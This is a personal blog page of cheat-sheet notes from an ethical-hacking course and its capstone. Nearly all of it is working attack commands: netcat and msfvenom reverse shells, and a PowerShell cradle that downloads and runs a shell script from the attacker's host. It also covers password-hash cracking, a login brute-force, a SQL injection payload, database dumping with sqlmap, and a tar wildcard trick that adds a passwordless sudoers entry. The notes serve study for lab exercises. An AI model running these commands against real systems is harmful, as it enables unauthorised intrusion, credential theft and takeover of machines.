@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head><title>Practical Ethical Hacking Capstone NOTES &ndash; tox@box</title>
+<meta name="description" content="A driven 16 y/o [infosec](https://tryhackme.com/p/toxic.sec) student from ohio looking for new opportunities to learn and grow :&gt;">
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8"/>
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==" crossorigin="anonymous" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />
+
+
+<link rel="stylesheet" href="https://pwnedbytoxic.github.io/css/palettes/windows-95.css">
+<link rel="stylesheet" href="https://pwnedbytoxic.github.io/css/risotto.css">
+<link rel="stylesheet" href="https://pwnedbytoxic.github.io/css/custom.css">
+
+
+<link rel="icon" href="https://pwnedbytoxic.github.io/favicon.ico">
+
+
+
+
+</head>
+
+    <body>
+        <div class="page">
+
+            <header class="page__header"><nav class="page__nav main-nav">
+    <ul>
+    <h1 class="page__logo"><a href="https://pwnedbytoxic.github.io/" class="page__logo-inner">tox@box</a></h1>
+    
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="https://pwnedbytoxic.github.io/about/" title="">About</a></li>
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="https://pwnedbytoxic.github.io/contact/" title="">Contact</a></li>
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="https://docs.google.com/document/d/1d3MAmEkQTfSShAZ_gmvj5IenSMp4fIKUwtbZhZvNWgs/edit?usp=sharing" title="">Resume</a></li>
+    
+    <li class="main-nav__item"><a class="nav-main-item active" href="https://pwnedbytoxic.github.io/posts/" title="Posts">Posts</a></li>
+    
+    </ul>
+</nav>
+
+</header>
+
+            <section class="page__body">
+    <header class="content__header">
+        <h1>Practical Ethical Hacking Capstone NOTES</h1>
+    </header>
+    
+    <div class="content__body">
+        <ul>
+<li><strong>hashdump — dump all user hashes (alternative to /etc/shadow)</strong></li>
+<li><strong>nc -lvp 4444 — netcat listening verbose port 4444</strong></li>
+<li><input disabled="" type="checkbox"> <strong>nc <a href="http://192.168.1.1">192.168.1.1</a> 4444 -e bin/sh — netcat connect to <a href="http://192.168.1.1">192.168.1.1</a> on port 4444, establish /bin/sh (cmd.exe)</strong></li>
+<li><input disabled="" type="checkbox"> <strong>python3 -c &lsquo;import pty;pty.spawn(&quot;/bin/bash&quot;)&rsquo; to stabilize pseudo-shell</strong>
+<ul>
+<li><strong>first use &ldquo;which python&rdquo; to check if python 3 is installed</strong></li>
+</ul>
+</li>
+<li><strong>/robots.txt for easy osint</strong></li>
+<li><a href="https://vk9-sec.com/ssh2john-how-to/">https://vk9-sec.com/ssh2john-how-to/</a> — tutorial for johntheripper ssh hash cracking:
+<ul>
+<li>/usr/share/john/ssh2john.py id_rsa &gt; forjohn.txt</li>
+<li>john --wordlist=/home/kali/rockyou.txt forjohn.txt</li>
+<li>ssh -i id_rsa <a href="mailto:example@0.0.0.0">example@0.0.0.0</a> to log into user with id_rsa key</li>
+</ul>
+</li>
+<li><strong>john --format=&lsquo;dynamic=sha512($p.$s)&rsquo; --wordlist=/home/kali/rockyou.txt hash.txt</strong>
+<ul>
+<li>cracks sha512 formatting with hash.txt</li>
+<li>hash.txt contains password$hash</li>
+</ul>
+</li>
+<li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">linPEAS</a> &amp; <a href="https://gtfobins.github.io/">GTFObins</a> — resources for privesc
+<ul>
+<li>wget http://[hostip]/linpeas.sh linpeas.sh on victim machine</li>
+<li>python python3 -m http.server 80 on host machine</li>
+</ul>
+</li>
+<li>msfvenom -p windows/x64/shell_reverse_tcp LHOST=[hostip] LPORT=9090 -f exe &gt; example.exe
+<ul>
+<li>leverages directory without quotes for a reverse shell</li>
+</ul>
+</li>
+<li>dnsrecon -r 127.0.0/24 -n [target ip] -d whatever
+<ul>
+<li>for usage when dns (port 53) is open</li>
+<li>-d (domain) is needed, though the string after can be anything</li>
+</ul>
+</li>
+</ul>
+<p><img src="/image.png" alt="image.png"></p>
+<ul>
+<li><strong><em>powershell iex (New-Object Net.WebClient).DownloadString(&lsquo;http://your-ip:80/Invoke-PowerShellTcp.ps1&rsquo;);Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port</em></strong>
+<ul>
+<li><em>use in nishang shells folder with</em> <strong>nc -lvp 4444</strong>  and <strong>python -m http.server 80</strong> for a reverse powershell shell</li>
+</ul>
+</li>
+<li><strong>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe</strong>
+<ul>
+<li>uses msfvenom to create a meterpreter shell</li>
+</ul>
+</li>
+<li><strong>MOST COMMONLY EXPLOITED TOKENS</strong>
+<ul>
+<li>SeImpersonatePrivilege</li>
+<li>SeAssignPrimaryPrivilege</li>
+<li>SeTcbPrivilege</li>
+<li>SeBackupPrivilege</li>
+<li>SeRestorePrivilege</li>
+<li>SeCreateTokenPrivilege</li>
+<li>SeLoadDriverPrivilege</li>
+<li>SeTakeOwnershipPrivilege</li>
+<li>SeDebugPrivilege
+<ul>
+<li>use <em>load incognito</em> in  metasploit</li>
+<li>then <em>list_tokens -g</em> to find tokens available for impersonation</li>
+<li>use <em>impersonate_token &ldquo;BUILTIN\Administrators&rdquo;</em>  to impersonate another token (hopefully administrator)</li>
+<li>use <em>ps</em> to list processes &amp; <em>migrate</em> to take on the permissions of one (safest is services.exe)</li>
+</ul>
+</li>
+<li><strong>Without Metasploit/Meterpreter</strong>
+<ul>
+<li><strong>upload printspoofer with http.server or otherwise</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>hydra -l &lt;username&gt; -P /usr/share/wordlists/&lt;wordlist&gt; &lt;ip&gt; http-post-form &lt;modifiedcookie&gt;</strong>
+<ul>
+<li>uses the http-post-form method to bruteforce a login with a modified cookie</li>
+</ul>
+</li>
+<li><img src="/image-1.png" alt="image-1.png">
+<ul>
+<li>cheetsheet for hydra commands</li>
+</ul>
+</li>
+<li><strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.41.195 LPORT=9999 -f exe &gt; msfshell.exe</strong>
+<ul>
+<li>creates a windows meterpreter reverse shell &amp; pipes it to an msfshell.exe binary (alternative to above)</li>
+</ul>
+</li>
+<li><strong>msfvenom -p cmd/unix/reverse_netcat lhost=[host ip] lport=9999 R</strong>
+<ul>
+<li><strong>creates netcat listener for meterpreter (linux)</strong></li>
+</ul>
+</li>
+<li><strong>powershell -c &ldquo;Invoke-WebRequest -Uri &lsquo;http://10.6.3.156:8000/msfshell.exe&rsquo; -Outfile &lsquo;C:\Windows\Temp\msfshell.exe&rsquo;&quot;</strong>
+<ul>
+<li>downloads file from python http server and pipes to a shell.exe file on machine</li>
+</ul>
+</li>
+<li><strong>' or 1=1 -- -</strong>
+<ul>
+<li><strong>sql injection — use this as username with no password on poorly secured sites</strong></li>
+</ul>
+</li>
+<li><strong>intercept textbox request with burpsuite�</strong>�
+<ul>
+<li><strong>sqlmap -r burprequest.txt --dbms=mysql --dump</strong>
+<ul>
+<li><strong>dumps all tables in database</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>john hash.txt --wordlist=/home/kali/rockyou.txt --format=Raw-SHA256</strong>
+<ul>
+<li><strong>cracks hash from tables</strong></li>
+</ul>
+</li>
+<li><strong>ss -tulpn [argument]</strong>
+<ul>
+<li><strong>shows socket connections</strong>
+<ul>
+<li><img src="/image-2.png" alt="image-2.png"></li>
+</ul>
+</li>
+<li><strong>ssh -L 10000:localhost:10000 &lt;username&gt;@&lt;ip&gt;</strong>
+<ul>
+<li>reverse SSH port forwarding</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>tar wildcard exploitation</strong>
+<ol>
+<li>use &ldquo;cat /etc/crontab&rdquo; to evaluate crontab (already done by linpeas)</li>
+<li>copy commands below for sudo privileges on target machine</li>
+</ol>
+</li>
+</ul>
+<p><strong>echo &lsquo;echo “www-data ALL=(root) NOPASSWD: ALL” &gt;&gt; /etc/sudoers&rsquo; &gt; <a href="http://sudo.sh">sudo.sh</a></strong></p>
+<p><strong>touch &ldquo;/var/www/html/--checkpoint-action=exec=sh sudo.sh&rdquo;</strong></p>
+<p><strong>touch &ldquo;/var/www/html/--checkpoint=1&rdquo;</strong></p>
+<ul>
+<li><strong>Wordpress MySql Table Dump</strong>
+<ul>
+<li><code>www-data@blog:/dev/shm$ mysql --host=</code>&lt;ip&gt;<code>--port 3306 -u wordpressuser -p</code></li>
+</ul>
+</li>
+</ul>
+
+    </div>
+    <footer class="content__footer"></footer>
+
+            </section>
+
+            <section class="page__aside">
+                <div class="aside__about">
+<div class="aside__about">
+    <img class="about__logo" src="https://pwnedbytoxic.github.io/images/rice.svg" alt="Logo">
+<h1 class="about__title">pwnedbytoxic</h1>
+<p class="about__description">A driven 16 y/o <a href="https://tryhackme.com/p/toxic.sec">infosec</a> student from ohio looking for new opportunities to learn and grow :&gt;</p>
+</div>
+
+
+<ul class="aside__social-links">
+    
+    <li>
+        <a href="https://www.linkedin.com/in/damon-hoody/" rel="me" aria-label="LinkedIn" title="LinkedIn"><i class="fa-brands fa-linkedin-in" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="https://www.instagram.com/damon.hoody/" rel="me" aria-label="Instagram" title="Instagram"><i class="fa-brands fa-instagram" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="https://github.com/pwnedbytoxic" rel="me" aria-label="GitHub" title="GitHub"><i class="fa-brands fa-github" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="mailto:hoody.damon@gmail.com" rel="me" aria-label="Email" title="Email"><i class="fa-solid fa-envelope" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="https://tryhackme.com/p/toxic.sec" rel="me" aria-label="TryHackMe" title="TryHackMe"><i class="fa fa-flag" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+</ul>
+</div>
+                <hr>
+                <div class="aside__content">
+    <p>Notes accumulated over the process of completing TCM Security&#39;s Practical Ethical Hacking Course &amp; its capstone project. Imported from Evernote</p>
+    
+        <p>
+            By toxic, 
+            2023-11-04
+        </p>
+    
+
+    
+
+                </div>
+            </section>
+
+            <footer class="page__footer"><p>
+    
+    
+    
+    
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+    
+    
+</p>
+<br /><br />
+<p class="copyright"></p>
+<p class="advertisement">// made by toxic //</p>
+</footer>
+
+        </div>
+    </body>
+
+</html>
